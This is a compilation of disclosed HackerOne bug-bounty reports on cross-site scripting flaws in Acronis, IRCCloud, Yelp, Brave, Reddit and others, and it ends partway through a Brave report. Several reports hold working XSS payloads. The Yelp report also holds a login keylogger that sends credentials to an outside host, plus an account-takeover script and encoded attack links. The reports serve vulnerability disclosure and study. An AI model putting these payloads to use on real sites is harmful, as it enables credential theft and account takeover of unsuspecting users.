# Cross-site Scripting (XSS) - Generic

_74 reports — High/Critical, disclosed_

### [ Potential XSS Vulnerability in Acronis Login Callback URL](https://hackerone.com/reports/2611305)

- **Report ID:** `2611305`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Acronis
- **Reporter:** @kindone
- **Bounty:** - usd
- **Disclosed:** 2024-11-06T09:21:27.023Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The login callback URL, https://learn.acronis.com/portal/, is vulnerable to Cross-Site Scripting (XSS) attacks. When a user logs in and is redirected to this URL, the redirectUrl parameter is not properly sanitized, allowing an attacker to inject arbitrary JavaScript code. This code could be used to steal the user's session cookie, perform phishing attacks, or deface the website.

## Steps To Reproduce
I was able to exploit this vulnerability by crafting a URL that included malicious JavaScript code in the redirectUrl parameter. When a user clicks on this URL and logs in, the injected code is executed in the user's browser.

For example, the following URL would display an alert containing the website domain: https://learn.acronis.com/portal/login-callback?redirectUrl=javascript:alert(document.domain)

An attacker could replace the alert with malicious code that steals the user's session cookie or redirects the user to a phishing website.

{F3449354}

## Impact

This vulnerability could allow an attacker to:

-    Steal user session cookies
 -   Perform phishing attacks
  -  Deface the website
   - Take control of user accounts

---

### [XSS from Mastodon embeds](https://hackerone.com/reports/1887917)

- **Report ID:** `1887917`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** IRCCloud
- **Reporter:** @lotsofloops
- **Bounty:** 500 usd
- **Disclosed:** 2023-10-09T04:00:23.621Z
- **CVE(s):** -

**Vulnerability Information:**

By default, the IRCCloud web client embeds Mastodon toots when a link to one is sent. Anyone can run a Mastodon server, and so the server from which toot data is fetched might be malicious. It is possible for an attacker to cause a web client user to execute arbitrary JavaScript in the context of the IRCCloud web client by tricking the web client into embedding a `javascript:` URL.

**POC**:
1. Ensure "Embed social media links" is enabled in settings under "Chat & embeds" (I think this is on by default)
2. Send a message with a link to https://sm4.ca/@a/123456789012345678 (the link itself 404s but IRCCloud only tries to use Mastodon API so it doesn't matter)
3. Wait a few seconds for the embed to load
4. Look at your session cookie

When the web client sees what looks like a toot URL, it tries to get canonical toot URL by making a query to `[domain]/api/v1/statuses/[toot ID]`. Here is what I serve at `https://sm4.ca/api/v1/statuses/123456789012345678`:

```json
{
  "account": {
    "url": "https://sm4.ca/@a"
  },
  "url": "javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//"
}
```

(`.account.url` is only present because the web client ensures it matches the original link)

The web client creates an `iframe` using `.url` as the src, which in this case is a `javascript:` URL. The specified script runs in a seperate document that has access to its parent, and can access anything the parent can. The `//` is needed at the end since the web client appends `/embed` to the embed URL.

(also apart from this particular issue, I don't think Mastodon embeds should be enabled unless "Embed 3rd party image and video links" is enabled since even when the Mastodon server isn't malicious your IP address is still leaked to an arbitrary server)

## Impact

An attacker who can send a message to an web-client-using IRCCloud user can obtain their session token and act as them. By sending a message with a malicious URL to a large channel an attacker could compromise many users at once.

---

### [yelp.com XSS ATO (via login keylogger, link Google account)](https://hackerone.com/reports/2010530)

- **Report ID:** `2010530`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Yelp
- **Reporter:** @lil_endian
- **Bounty:** - usd
- **Disclosed:** 2023-08-15T11:59:03.777Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary:
yelp.com reflects the content of the cookie `guvo` in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a `guvo` cookie inside a cookie named `yelpmainpaastacanary`. The `yelpmainpaastacanary` cookie can be set by including a URL query parameter `?canary=[Cookie value]`  in any request to `*.yelp.com`.

This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on `https://biz.yelp.com/login` to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".

# Description
## XSS via "guvo" cookie
The value of the cookie `guvo` is reflected (unescaped) on some pages. Most interestingly on the frontpage of `www.yelp.com` and on the login page of `https://biz.yelp.com/login`. The unescaped reflection happens in the `window.ySitRepParams` object and the `window.yelp.guv` property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████

## Setting the "yelpmainpaastacanary" cookie
There is a feature on `yelp.com` where by adding the query parameter `?canary=asdf` to a request, the response will contain an HTTP header:
```
Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```
This gives us a way to set the cookie `yelpmainpaastacanary` to any value we want. But we need a way to control the `guvo` cookie. It turns out that we can smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie.

## Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
```
Cookie: a=1; b=2;
```
which should be parsed as 2 cookies `a` and `b`. But if we set a cookie like:
```
Cookie: a=1 b=2;
```
This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`. We can abuse this to smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie by making a request to 
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
████

which sets the cookie
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
```
and results in our XSS payload triggering every time we visit the front page of `www.yelp.com`:
{F2394020}

As an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

# POCs
_Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains._

## Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on `https://biz.yelp.com/login` when the user types, or when the login form is submitted. The credentials are leaked to the domain `calc.sh` which I own:
```javascript
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
```
Our final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███

## Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from `https://yelp.com/profile_sharing`. The final request in the Google-link-flow is a POST request to `https://www.yelp.dk/google_connect/register` with CSRF token `csrftok` and a token `id_token` which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.

To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████

Now that we have a token for the Google accoutn `██████` we can create an XSS payload for a victim. In this code we make a request to `/profile_sharing` and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the `id_token` we prepared:
```javascript
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg";
    b = rx.exec(this.responseText);
    fetch("https://www.yelp.dk/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
  });
  a.open('GET', 'https://www.yelp.dk/profile_sharing');
  a.send();
})();
```

Again, we use this cyberchef recipe to create a link that infects the victim:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw
```

And the final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

This video shows the attack. On the left is the victim and on the right is the attacker. The victim is logged into their yelp account. He then signs out and at some point visits our malicious link. When the victim sometime later signs into his Yelp account our payload triggers and our Google account `████` is linked to the victim. The attacker can now sign in with Google and gets signed into the victims account.
██████████

## Impact

This attack can be used to completely compromise business accounts, and do account takeovers on normal accounts on yelp.com. Since the cookie does not expire, all it takes is for the victim to at some point vist our link, and they'll be compromised when they later go to sign in to yelp.com. The link can be spread via the Yelp forum, reviews or private messages to other uses, making it easy to target other Yelp users.

---

### [XSS on rockstargames.com](https://hackerone.com/reports/212700)

- **Report ID:** `212700`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Rockstar Games
- **Reporter:** @zuhnny1
- **Bounty:** 500 usd
- **Disclosed:** 2023-07-25T20:10:26.666Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher reported a reflected Cross-Site Scripting (XSS) vulnerability on the Max Payne 3 sub-site on rockstargames.com. The vulnerability has since been resolved.

---

### [Universal XSS through FIDO U2F register from subframe](https://hackerone.com/reports/993670)

- **Report ID:** `993670`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 1000 usd
- **Disclosed:** 2023-06-22T05:52:28.802Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

There are three weaknesses in Brave's FIDO U2F implementation.

* `u2f.register()` can be executed from cross-origin subframe by invoking [U2F.postMessage](https://github.com/brave/brave-ios/blob/e52c52495aa654584abe8172d689977756e6549d/Client/Frontend/UserContent/UserScripts/U2F.js#L264) directly
* Then, FIDO related modals show the name of top frame origin (but not caller subframe)
* The `version` parameter sent from the above `postMessage` is embedded in an [evaluateJavaScript](https://github.com/brave/brave-ios/blob/d01b8c07b8a6244af48798efe4afeccd266707e2/Client/WebAuthN/U2FExtensions.swift#L1003) without escape

The combination of these weaknesses allows cross-domain subframe to inject any JavaScript code to the top frame through fake U2F registration process.
## Products affected: 

 * Brave iOS Version 1.20 (20.09.11.20), also current Nightly

## Steps To Reproduce:

* Open [UXSS Victim](https://alice.csrf.jp/brave/uxss_victim.php) hosted on alice.csrf.jp.
  This site has a cross-origin iframe that opens evil.csrf.jp.
* Ready to Scan dialog is shown with the name of top frame
* Insert your FIDO device such as YubiKey 5Ci and touch
* Injected JavaScript `alert()` is executed on the top frame

## Supporting Material/References:

  * See attached movie file for the demonstration

## Impact

As written in summary, malicious web content in subframe can UXSS on the top frame origin.

---

### [New XSS vector in ReaderMode with %READER-TITLE-NONCE%](https://hackerone.com/reports/1436142)

- **Report ID:** `1436142`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 1000 usd
- **Disclosed:** 2023-06-22T05:51:33.965Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Previously, script execution in ReaderMode pages was prohibited by CSP. However, three months ago, [this commit](https://github.com/brave/brave-ios/pull/4209/files#diff-eaeef15a290e9e5e9bcaae784f18d874f8c932dfa3de416a5820eccd6b2d8cfbR54) partially relaxed the CSP and scripts with `nonce-%READER-TITLE-NONCE%` are now allowed to be executed. This relaxation of the CSP rule can be exploited for XSS attacks on ReaderMode pages.

Here, the attack vector is `%READER-CREDITS%` which is also [included in the ReaderMode HTML template](https://github.com/brave/brave-ios/blob/6f667506228eeff77daf4df7c9dddae22eb0ad1b/Client/Frontend/Reader/Reader.html#L18). The `%READER-CREDITS%` is replaced with the value of the `<meta name="author">` tag in the original page, but then the HTML tags are not escaped. So, when the following meta tag is embedded in the original page and the page is displayed in ReaderMode, [this Swift code](https://github.com/brave/brave-ios/blob/6f667506228eeff77daf4df7c9dddae22eb0ad1b/Client/Frontend/Reader/ReaderModeUtils.swift#L30)  replaces `%READER-TITLE-NONCE%` with the correct nonce value.
```
<meta name="author" content="Evil &lt;script nonce=%READER-TITLE-NONCE%&gt;alert(document.location);&lt;/script&gt;!--">
```

As a result, the malicious script will be executed on a page `http://localhost:6571/reader-mode?uri={uri}&uuidkey={value}`.
In Brave, all readalized pages are hosted on `http://localhost:6571`. Therefore, through this XSS, any cross-origin pages, that has been converted to ReaderMode, can be stolen by embedding an iframe and reading out them. Also, please find that the `uuidkey` is included in the URL query string. By obtaining this key, the attacker can gain access to Brave's privileged pages.

## Products affected: 

 * Brave iOS 1.31.1 and higher (including the latest Nightly)

## Steps To Reproduce:

 * Show https://csrf.jp/2021/brave/author_xss.php
 * Push reader mode button on the address bar
 * An alert dialog is shown

## Supporting Material/References:

 * See the screenshot of the alert dialog when the bug is reproduced.

## Impact

* Any cross-origin pages, that has been converted to ReaderMode, can be stolen
* Attacker can gain access to Brave's privileged pages

---

### [XSS on internal: privileged origin through reader mode](https://hackerone.com/reports/1438028)

- **Report ID:** `1438028`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Brave Software
- **Reporter:** @nishimunea
- **Bounty:** 500 usd
- **Disclosed:** 2023-06-22T05:51:13.868Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Brave iOS has two weaknesses described below. By combining them, XSS can be achieved on the privileged origin `internal://local`.

1. Exposure of uuidKey through REFERER header
Reader mode in Brave has two HTML templates, [Reader.html](https://github.com/brave/brave-ios/blob/development/Client/Frontend/Reader/Reader.html) and [ReaderViewLoading.html](https://github.com/brave/brave-ios/blob/development/Client/Frontend/Reader/ReaderViewLoading.html). The former template defines [<meta name="referrer" content="never">](https://github.com/brave/brave-ios/blob/development/Client/Frontend/Reader/Reader.html#L10) header for preventing referrer leakage, but the latter template [does not](https://github.com/brave/brave-ios/blob/development/Client/Frontend/Reader/ReaderViewLoading.html#L8). Therefore, by opening an external page through `ReaderViewLoading.html`, the `uuidKey` contained in the Reader mode page URL is leaked.

2. XSS in SessionRestoreHandler
SessionRestoreHandler is used to restore a previously used tab, but [it does not validate an URL to be restored](https://github.com/brave/brave-ios/blob/83eb41ac922d7bd18fd311e0a4279e02cdd8e190/Client/Frontend/Browser/SessionRestoreHandler.swift#L34). Therefore, if a javascript: URL is provided, the code is executed on the `internal:` domain.

Note that the first vulnerability is not reproduced on iOS 15 because WKWebView's referrer policy has been changed to hostname only. However, according to [Apple's report in June 2021](https://developer.apple.com/support/app-store/), more than 90% of users were using iOS 14.

## Products affected: 

* Brave iOS 1.32.3 and higher (include the latest Nightly) on iOS 14.x and below

## Steps To Reproduce:

* Visit https://csrf.jp/brave/reader_uuid_leakage.php
* Open the page in Reader mode
* Long tap a hyperlink in the page and choose "Open in New Private Tab"
* Wait for several seconds and tap "Load original page"
* uuidKey in the reader mode URL is stolen through REFERER header
* Click an exploit URL in the page, then XSS is triggered on `internal://local`

## Supporting Material/References:

* xss_on_internal_origin_through_reader_mode.mov: video of the attack against the vulnerabilities
* reader_uuid_leakage.php: server-side exploit code

## Impact

* Attacker can elevate privileges to `internal:` origin

---

### [[accounts.reddit.com] Redirect parameter allows for XSS](https://hackerone.com/reports/1962645)

- **Report ID:** `1962645`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Reddit
- **Reporter:** @dvorakxl
- **Bounty:** 5000 usd
- **Disclosed:** 2023-05-18T13:46:49.459Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello team! I was tampering with the dest parameter in accounts.reddit.com and found out it is vulnerable to Cross Site Scripting once the victim performs the log in.

## Steps To Reproduce:
  1. Enter to the following link: ```https://accounts.reddit.com/?dest=javascript:alert(document.domain)```
  - If not signed in, the user will be promped to log in and after doing so XSS will excecute

{F2315850}
  - If user is logged into his account, following the link will also make the XSS pop up

{F2315847}

## Impact

An attacker could trick users into executing XSS, executing code and stealing their cookies only by them logging in.

---

### [UXss on brave browser via scan QR Code](https://hackerone.com/reports/1884042)

- **Report ID:** `1884042`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Brave Software
- **Reporter:** @mrzheev
- **Bounty:** - usd
- **Disclosed:** 2023-04-11T21:04:29.553Z
- **CVE(s):** CVE-2022-23258

**Vulnerability Information:**

## Summary:

I found UXss in your browser, and executed Xss on all open domains.
before that I want to tell you a little, that I've found a vulnerability like this in Microsoft Edge :
https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-23258

Oppo browser : (Private/no disclosure)

and now i found it in your application

## Products affected: 

 * Android 13, Brave browser version 1.48.164,  Brave Nightly browser version 1.50.53, Brave Beta Browser version 1.49.106, Chromium 110.5481.100


Payload : {F2191688}
This is a QR Code containing the url : javascript:alert(document.domain);

which the attacker will use to attack the victim


## Steps To Reproduce:
- Open Brave browser
- Open www.google.com

{F2191713}
- Click the url bar and delete the url (click the cross on the Url Bar)

{F2191709}
- You will see a Scan QR Code button

{F2191707}
